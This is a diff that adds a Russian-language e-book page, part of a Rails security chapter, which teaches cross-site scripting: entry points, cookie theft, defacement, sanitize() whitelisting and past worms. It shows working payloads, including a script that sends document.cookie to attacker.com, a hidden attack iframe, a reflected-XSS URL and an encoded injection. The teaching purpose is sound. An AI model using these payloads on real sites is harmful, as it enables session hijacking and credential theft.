@@ -1,0 +1,327 @@
+
+<!DOCTYPE html>
+
+<html lang="ru">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width" />
+    <link rel="stylesheet" type="text/css" href="../../../../css/read.css" />
+    <title>Coder Book menu</title>
+    <script type="text/javascript" src="../../../../higtline/scripts/shCore.js"></script>
+    <script type="text/javascript" src="../../../../higtline/scripts/shBrushCSharp.js"></script>
+    <link type="text/css" rel="stylesheet" href="../../../../higtline/styles/shCoreDefault.css"/>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+    <script src="../../../../js/Hyphenator.js" type="text/javascript"></script>
+</head>
+
+<body id="pageBody" class="hyphenate">
+
+<!-- progress bar -->
+<script src="../../../../js/progressBar.js" type="text/javascript"></script>
+<div class="Reading-progress" id="progressBarType1"><span id="Progress-bar-top" class="bar-top" style="display: block !important;"></span></div>
+<div class="Reading-progress" id="progressBarType2"><span id="Progress-bar-bottom" class="bar-bottom"></span></div>
+<div class="Reading-progress" id="progressBarType3"><span id="Progress-bar-left" class="bar-left"></span></div>
+<div class="Reading-progress" id="progressBarType4"><span id="Progress-bar-right" class="bar-right"></span></div>
+<!-- progress bar -->
+
+
+    <div id="lesonPage">
+
+        <div id="lessMenu">
+           <a id="exitLess" href="list.html" ontouchstart="return true;"><img src="../../../../img/menu/ex.png" /></a>
+           <div id="aaLess" ontouchstart="return true;" onclick="OpenSettMenu();"><img src="../../../../img/menu/aa.png" /></div>
+           <div id="subMenuInLess" style="display: none;">
+                <a href="../../../../menu/setfontsize-ru.html" ontouchstart="return true;" id="pastMenuInLess">Размер текста</a>
+                <a href="../../../../menu/setcolor-ru.html" ontouchstart="return true;" id="pastMenuInLess">Цветовая темы</a>
+                <a href="../../../../menu/setProgressBar-ru.html" ontouchstart="return true;" id="pastMenuInLess" style="border: none;">Прогресс бар</a>
+           </div>
+           <div id="aaLess" ontouchstart="return true;">
+            <div class="bmEdit" onclick="dellBm();" id="bma1364" ontouchstart="return true;" style="display: none;"><img src="../../../../img/menu/bmlessa.png" /></div>
+            <div class="bmEdit" onclick="setzBm();" id="bm1364" ontouchstart="return true;" style="display: block;"><img src="../../../../img/menu/bmless.png" /></div>
+           </div>
+        </div>
+
+        <hr />
+
+    <!-- ПОЧАТОК -->
+    
+    <h1 id="title">
+        Межсайтовый скриптинг (XSS)
+    </h1>
+    
+    <p>Наиболее распространенная и одна из наиболее разрушительных уязвимостей в веб-приложениях - это XSS.</p>
+    <p>Данная вредоносная атака внедряет на стороне клиента исполняемый код.</p>
+    <p>Rails предоставляет методы для защиты от этих атак.</p>
+
+    <h2 id="title">
+        Точки входа
+    </h2>
+    
+    <p>Точка входа - это уязвимый URL и его параметры, с которых злоумышленник может начать атаку.</p>
+    <p>Наиболее распространенными точками входа являются публикации сообщений, комментарии пользователей и гостевые книги, но заголовки проектов, имена документов и страницы результата поиска также бывают уязвимы - почти везде, где пользователь может ввести данные.</p>
+    <p>Но ввод не обязательно может прийти из полей ввода на веб-сайтах, это может быть любой параметр URL – очевидный, скрытый или внутренний.</p>
+    <p>Помните, что пользователь может перехватить любой трафик.</p>
+    <p>Приложения или клиентские прокси могут легко изменить запросы.</p>
+    <p>Также имеются иные направления атак, такие как баннерная реклама.</p>
+    <p>Атаки XSS работают подобным образом: злоумышленник встраивает некоторый код, веб-приложение сохраняет его и отображает на странице, после чего представляет его жертве.</p>
+    <p>Большинство примеров XSS просто отображают сообщение, но реальные возможности гораздо мощнее.</p>
+    <p>XSS может своровать куки, похитить сессию, перенаправить жертву на фальшивый веб-сайт, отобразить рекламу, полезную злоумышленнику, изменить элементы на веб-странице, чтобы получить конфиденциальную информацию или установить вредоносное программное обеспечение, используя дыры в веб-браузере.</p>
+    <p>Во второй половине 2007 года выявлено 88 уязвимостей в браузерах Mozilla, 22 в Safari, 18 в IE и 12 в Opera.</p>
+    <p>Symantec Global Internet Security threat report также задокументировал 239 уязвимостей плагинов для браузеров в последние шесть месяцев 2007 года.</p>
+    <p>Mpack очень активный и регулярно обновляемый фреймворк злоумышленников, который использует эти уязвимости.</p>
+    <p>Для преступных хакеров очень привлекательно использовать уязвимость к SQL-инъекциям в фреймворке веб-приложения и вставлять вредоносный код в каждый текстовый столбец таблицы.</p>
+    <p>В апреле 2008 года более 510,000 сайтов были взломаны подобным образом, в том числе Британского правительства, ООН и многих других высокопоставленных организаций.</p>
+
+    <h2 id="title">
+        HTML/JavaScript инъекции
+    </h2>
+    
+    <p>Наиболее распространенным языком для XSS является, конечно, наиболее популярный клиентский скриптовый язык JavaScript, часто в сочетании с HTML.</p>
+    <p>Экранирование пользовательского ввода необходимо.</p>
+    <p>Вот самый простой тест для проверки на XSS:</p>
+
+    <pre class="brush: csharp;">
+    &lt;script&gt;alert(&apos;Hello&apos;);&lt;/script&gt;
+    </pre>
+
+    <p>Этот код JavaScript просто отображает сообщение.</p>
+    <p>Следующие примеры делают примерно то же самое, но в очень необычных местах:</p>
+
+    <pre class="brush: csharp;">
+    &lt;img src=javascript:alert(&apos;Hello&apos;)&gt;
+    &lt;table background=&quot;javascript:alert(&apos;Hello&apos;)&quot;&gt;
+    </pre>
+
+    <h3 id="title">
+        Похищение куки
+    </h3>
+
+    <p>Пока эти примеры не делали никакого вреда, поэтому давайте посмотрим, как злоумышленник может похитить куки пользователя (и, таким образом, похитить пользовательскую сессию).</p>
+    <p>В JavaScript можно использовать свойство document.cookie для чтения и записи куки документа.</p>
+    <p>JavaScript обеспечивает политику ограничения домена, которая означает, что скрипт с одного домена не может получить доступ к куки другого домена.</p>
+    <p>Свойство <b>document.cookie</b> содержит куки создавшего веб-сервера.</p>
+    <p>Однако это свойство можно прочитать и записать, если внедрите код непосредственно в документ HTML (как это происходит в XSS).</p>
+    <p>Введите это где-нибудь в своем веб-приложении, чтобы увидеть собственные куки на результирующей странице:</p>
+
+    <pre class="brush: csharp;">
+    &lt;script&gt;document.write(document.cookie);&lt;/script&gt;
+    </pre>
+
+    <p>Для злоумышленника, разумеется, бесполезно, что жертва видит свои куки.</p>
+    <p>Следующий пример пытается загрузить изображение с URL <b>http://www.attacker.com/</b> плюс куки.</p>
+    <p>Конечно, этот URL не существует, поэтому браузер ничего не отобразит.</p>
+    <p>Но злоумышленник сможет просмотреть логи доступа к своему веб-серверу, чтобы увидеть куки жертв.</p>
+
+    <pre class="brush: csharp;">
+    &lt;script&gt;document.write(&apos;&lt;img src=&quot;http://www.attacker.com/&apos; + document.cookie + &apos;&quot;&gt;&apos;);&lt;/script&gt;
+    </pre>
+
+    <p>Лог файлы на <b>www.attacker.com</b> будут подобны следующему:</p>
+
+    <pre class="brush: csharp;">
+    GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+    </pre>
+
+    <p>Можно смягчить эти атаки (очевидным способом) добавив к куки флаг httpOnly, таким образом, <b>document.cookie</b> не сможет быть прочитан JavaScript.</p>
+    <p>Http only куки могут использоваться начиная с IE v6.SP1, Firefox v2.0.0.5 и Opera 9.5, Safari 4 и Chrome 1.0.154 и выше.</p>
+    <p>Но другие, более старые браузеры (такие как WebTV и IE 5.5 on Mac) могут фактически отказаться загружать страницу.</p>
+    <p>Однако, будьте осторожны, что куки все еще видны при использовании Ajax.</p>
+
+    <h3 id="title">
+        Искажение
+    </h3>
+
+    <p>Исказив веб-страницу, злоумышленник сможет сделать многое, например, предоставить ложную информацию или завлечь жертву на сайт злоумышленника, чтобы украсть куки, регистрационные данные или другую деликатную информацию.</p>
+    <p>Наиболее популярным способом является включение кода с внешних источников с помощью iframe:</p>
+
+    <pre class="brush: csharp;">
+    &lt;iframe name=&rdquo;StatPage&rdquo; src=&quot;http://58.xx.xxx.xxx&quot; width=5 height=5 style=&rdquo;display:none&rdquo;&gt;&lt;/iframe&gt;
+    </pre>
+
+    <p>Это загрузит произвольный HTML и/или JavaScript с внешнего источника и внедрит его, как часть сайта.</p>
+    <p>Этот iframe взят из настоящей атаки на правительственные итальянские сайты с использованием Mpack attack framework.</p>
+    <p>Mpack пытается установить злонамеренное программное обеспечение через дыры безопасности в веб-браузере – очень успешно, 50% атак успешны.</p>
+    <p>Более специализированные атаки могут накрывать целые веб-сайты или отображать форму входа, которая выглядит как такая же на оригинальном сайте, но передает имя пользователя и пароль на сайт злоумышленников.</p>
+    <p>Или могут использовать CSS и/или JavaScript, чтобы спрятать настоящую ссылку в веб-приложении, и отобразить на ее месте другую, которая перенаправит на фальшивый веб-сайт.</p>
+    <p>Атаки в форме искажающих инъекций являются такими, что основная загрузка не хранится, а предоставляется жертве позже, но включена в URL.</p>
+    <p>Особенно в формах поиска не получается экранировать строку поиска.</p>
+    <p>Следующая ссылка представляет страницу, озаглавленную "George Bush appointed a 9 year old boy to be the chairperson...":</p>
+
+    <pre class="brush: csharp;">
+    http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
+      &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
+    </pre>
+
+    <h3 id="title">
+        Контрмеры
+    </h3>
+
+    <p>Очень важно отфильтровывать злонамеренный ввод, но также важно экранировать вывод в веб-приложении.</p>
+    <p>Особенно для XSS, важно делать фильтрацию ввода с помощью белого списка, а не черного.</p>
+    <p>Фильтрация белым списком устанавливает допустимые значения, остальные значения недопустимы.</p>
+    <p>Черные списки всегда не законченные.</p>
+    <p>Предположим, черный список удаляет "script" из пользовательского ввода.</p>
+    <p>Теперь злоумышленник встраивает <b>"&lt;scrscriptipt&gt;"</b>, и после фильтра остается "&lt;script&gt;".</p>
+    <p>Ранние версии Rails использовали подход черного списка для методов <b>strip_tags()</b>, <b>strip_links()</b> и <b>sanitize()</b>.</p>
+    <p>Поэтому такой сорт инъекций был возможен:</p>
+
+    <pre class="brush: csharp;">
+    strip_tags(&quot;some&lt;&lt;b&gt;script&gt;alert(&apos;hello&apos;)&lt;&lt;/b&gt;/script&gt;&quot;)
+    </pre>
+
+    <p>Это возвратит "some&lt;script&gt;alert(&apos;hello&apos;)&lt;/script&gt;", что позволит осуществиться атаке.</p>
+    <p>Вот почему подход белого списка лучше при использовании метода Rails 2 sanitize():</p>
+
+    <pre class="brush: csharp;">
+    tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+    s = sanitize(user_input, tags: tags, attributes: %w(href title))
+    </pre>
+
+    <p>Это допустит только заданные теги и сделает все хорошо, даже против всех ухищрений и злонамеренных тегов.</p>
+    <p>В качестве второго шага, хорошо экранировать весь вывод в приложении, особенно при отображении пользовательского ввода, который не был отфильтрован при вводе (как в примере выше).</p>
+    <p>Используйте метод escapeHTML() (или его псевдоним h()), чтобы заменить введенные символы HTML &, ", &lt;, &gt; их неинтерпретируемыми представителями в HTML (&amp;amp;, &amp;quot;, &amp;lt; и &amp;gt;).</p>
+
+    <h3 id="title">
+        Обфусцированная и закодированная инъекция
+    </h3>
+    
+    <p>Сетевой трафик главным образом основан на ограниченном Западном алфавите, поэтому новые кодировки символов, такие как Unicode, возникли для передачи символов на других языках.</p>
+    <p>Но это также угроза для веб-приложений, так как злонамеренный код может быть спрятан в различных кодировках, так что веб-браузер сможет его выполнить, а веб-приложение нет.</p>
+    <p>Вот направление атаки в кодировке UTF-8:</p>
+
+    <pre class="brush: csharp;">
+    &lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;
+      &amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&gt;
+    </pre>
+
+    <p>Этот пример вызывает окно сообщения. Хотя это распознается фильтром sanitize().</p>
+    <p>Хорошим инструментом для обфускации и кодирования строк (знайте своего врага!) является Hackvertor.</p>
+    <p>Метод Rails sanitize() работает хорошо, отражая закодированные атаки.</p>
+
+    <h2 id="title">
+        Примеры из прошлого
+    </h2>
+    
+    <p>Чтобы понять сегодняшние атаки на веб-приложения, лучше взглянуть на некоторые реальные направления атаки.</p>
+    <p>Ниже приведена выдержка из Js.Yamanner@m Yahoo! почтовый червь.</p>
+    <p>Он появился 11 июня 2006 года и был первым червем для почтового интерфейса:</p>
+
+    <pre class="brush: csharp;">
+    &lt;img src=&apos;http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif&apos;
+      target=&quot;&quot;onload=&quot;var http_request = false;    var Email = &apos;&apos;;
+      var IDList = &apos;&apos;;   var CRumb = &apos;&apos;;   function makeRequest(url, Func, Method,Param) { ...
+    </pre>
+
+    <p>Черви использовали дыру в фильтре HTML/JavaScript Yahoo, который обычно фильтровал все атрибуты target и onload из тегов (потому что там мог быть JavaScript).</p>
+    <p>Однако фильтр применялся только раз, поэтому атрибут onload с кодом червя оставался.</p>
+    <p>Это хороший пример, почему фильтры черного списка никогда не полные, и почему трудно позволить HTML/JavaScript в веб-приложении.</p>
+    <p>Другой прототипный веб-почтовый червь Nduja, кроссдоменный червь для четырех итальянских веб-почтовых сервисов.</p>
+    <p>Более детально описано в статье Rosario Valotta.</p>
+    <p>Оба почтовых червя имели целью собрать почтовые адреса, на чем преступный хакер мог сделать деньги.</p>
+    <p>В декабре 2006 года 34,000 имени фактических пользователей и их пароли были похищены во время фишинговой атаки на MySpace.</p>
+    <p>Идеей атаки было создание профиля, названного "login_home_index_html", поэтому URL выглядел очень правдоподобно.</p>
+    <p>Специально созданный HTML и CSS использовался, чтобы скрыть настоящий контент MySpace и вместо этого отразить собственную форму входа.</p>
+
+    <script src="../../../../js/progressBarSetIni.js" type="text/javascript"></script>
+
+        <div id="lessMenu" style="margin: 30px 0 0 0;">
+            <hr />
+            <a href="25.html"><div id="exitLess" ontouchstart="return true;"><img src="../../../../img/menu/pr.png" /></div></a>
+            <a href="27.html"><div id="aaLess" ontouchstart="return true;"><img src="../../../../img/menu/ne.png" /></div></a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript" src="../../../../cordova.js"></script>
+    <script type="text/javascript" src="../../../../js/global.js"></script>
+    <script type="text/javascript">
+        changeColor();
+        if (localStorage.getItem("fSize") < 1) { fSize = 16; localStorage.setItem("fSize", 16); } else { fSize = localStorage.getItem("fSize"); }
+        document.getElementById("pageBody").style.fontSize = fSize + "px";
+
+        // goBackMenu
+        document.addEventListener("backbutton", goBackMenu, false);
+        function goBackMenu()
+        {
+            window.location.href = 'list.html';
+        }
+
+        function changeColor()
+        {
+            if (localStorage.getItem("colorSheme") <= 1)
+            {
+                document.getElementById("pageBody").style.backgroundColor = localStorage.getItem("#f0f0f0");
+            }
+
+            if (localStorage.getItem("colorSheme") == 2)
+            {
+                document.getElementById("pageBody").style.backgroundColor = localStorage.getItem("#212121");
+                document.getElementById("pageBody").style.color = localStorage.getItem("#efefef");
+            }
+
+            if (localStorage.getItem("colorSheme") == 3)
+            {
+                document.getElementById("pageBody").style.backgroundColor = localStorage.getItem("#efe4d0");
+            }
+        }
+
+        // bm
+        if (localStorage.getItem("arrs") != null)
+        {
+            var arrs = JSON.parse(localStorage.getItem("arrs"));
+        }
+        else
+        {
+            var arrs = [];
+        }
+
+        var names = ["../acharter/ru/ruby/sec/26.html", "Межсайтовый скриптинг (XSS)", "bm1364"];
+
+        function setzBm() { arrs.push(names); localStorage.setItem("arrs", JSON.stringify(arrs)); localStorage.setItem("bm1364", 1); RefBms(); }
+
+        window.onload = function() { RefBms(); }
+
+        function RefBms()
+        {
+            if (localStorage.getItem("bm1364") == 1) { document.getElementById("bma1364").style.display = "block"; document.getElementById("bm1364").style.display = "none"; } else { document.getElementById("bma1364").style.display = "none"; document.getElementById("bm1364").style.display = "block"; }
+        }
+
+        function dellBm() { for (var i = 0; i < arrs.length; i++) { if (arrs[i].indexOf("Межсайтовый скриптинг (XSS)") == 1) { arrs.splice(i, 1); localStorage.setItem("bm1364", 0); RefBms(); localStorage.setItem("arrs", JSON.stringify(arrs)); } } }
+
+        // sub menu
+        var serTimeToClose = 1000;
+        
+        function OpenSettMenu()
+        {
+            document.getElementById("subMenuInLess").style.display = "block";
+            timeToEvAct();
+            serTimeToClose = 1;
+        }
+        
+        function timeToEvAct()
+        {
+            setTimeout(function() { serTimeToClose = 0 }, 100);
+        }
+        
+        window.addEventListener('click', function(e){
+        
+            if (serTimeToClose <= 0)
+            {
+                if (document.getElementById('subMenuInLess').contains(e.target))
+                {
+                    //
+                }
+                else
+                {
+                    document.getElementById("subMenuInLess").style.display = "none";
+                }
+            }
+        });
+
+    </script>
+
+</body>
+</html>
